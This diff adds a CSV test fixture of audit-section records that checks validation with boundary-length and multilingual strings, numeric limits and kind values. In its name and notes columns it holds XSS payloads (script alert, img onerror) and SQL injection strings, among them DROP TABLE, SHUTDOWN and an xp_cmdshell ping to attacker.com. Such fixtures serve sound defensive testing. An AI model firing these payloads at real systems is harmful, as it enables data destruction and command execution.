@@ -1,0 +1,41 @@
+key,name,notes,hours,kind,key:audit-report
+# base entity
+audit-section-01,example,example,10,PRELIMINARY,audit-report-01
+# name,"","","","",""
+audit-section-02,L,example,10,PRELIMINARY,audit-report-54
+audit-section-03,Lo,example,10,PRELIMINARY,audit-report-01
+audit-section-04,"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do: eiusmod t",example,10,PRELIMINARY,audit-report-01
+audit-section-05,"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do: eiusmod te",example,10,PRELIMINARY,audit-report-01
+audit-section-06,โลเร็ม อิปซัม,example,10,PRELIMINARY,audit-report-01
+audit-section-07,لوريم إيبسوم,example,10,PRELIMINARY,audit-report-01
+audit-section-08,洛伦·伊普森,example,10,PRELIMINARY,audit-report-01
+audit-section-09,<marquee>Hacked</marquee>,example,10,PRELIMINARY,audit-report-01
+audit-section-10,<script>alert(‘Hacked!’);</script>,example,10,PRELIMINARY,audit-report-01
+audit-section-11,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",example,10,PRELIMINARY,audit-report-01
+audit-section-12,' or 'A' = 'A,example,10,PRELIMINARY,audit-report-01
+audit-section-13,'; DROP TABLE user_account;--,example,10,PRELIMINARY,audit-report-01
+audit-section-14,'; SHUTDOWN;--,example,10,PRELIMINARY,audit-report-01
+audit-section-15,'; EXEC xp_cmdshell('ping attacker.com');--,example,10,PRELIMINARY,audit-report-01
+# notes,"","","","",""
+audit-section-16,example,L,10,PRELIMINARY,audit-report-01
+audit-section-17,example,Lo,10,PRELIMINARY,audit-report-01
+audit-section-18,example,"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do: eiusmod tempor incididunt ut labore et dolore magna aliqua! Ut enim ad minim veniam? Quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor",10,PRELIMINARY,audit-report-01
+audit-section-19,example,"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do: eiusmod tempor incididunt ut labore et dolore magna aliqua! Ut enim ad minim veniam? Quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor*",10,PRELIMINARY,audit-report-01
+audit-section-20,example,โลเร็ม อิปซัม,10,PRELIMINARY,audit-report-01
+audit-section-21,example,لوريم إيبسوم,10,PRELIMINARY,audit-report-01
+audit-section-22,example,洛伦·伊普森,10,PRELIMINARY,audit-report-01
+audit-section-23,example,<marquee>Hacked</marquee>,10,PRELIMINARY,audit-report-01
+audit-section-24,example,<script>alert(‘Hacked!’);</script>,10,PRELIMINARY,audit-report-01
+audit-section-25,example,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",10,PRELIMINARY,audit-report-01
+audit-section-26,example,' or 'A' = 'A,10,PRELIMINARY,audit-report-01
+audit-section-27,example,'; DROP TABLE user_account;--,10,PRELIMINARY,audit-report-01
+audit-section-28,example,'; SHUTDOWN;--,10,PRELIMINARY,audit-report-01
+audit-section-29,example,'; EXEC xp_cmdshell('ping attacker.com');--,10,PRELIMINARY,audit-report-01
+# hours,"","","","",""
+audit-section-30,example,example,0,PRELIMINARY,audit-report-01
+audit-section-31,example,example,1,PRELIMINARY,audit-report-01
+audit-section-32,example,example,99999,PRELIMINARY,audit-report-01
+audit-section-33,example,example,100000,PRELIMINARY,audit-report-01
+# kind,"","","","",""
+audit-section-34,example,example,10,EVALUATION,audit-report-01
+audit-section-35,example,example,10,CONCLUSION,audit-report-01
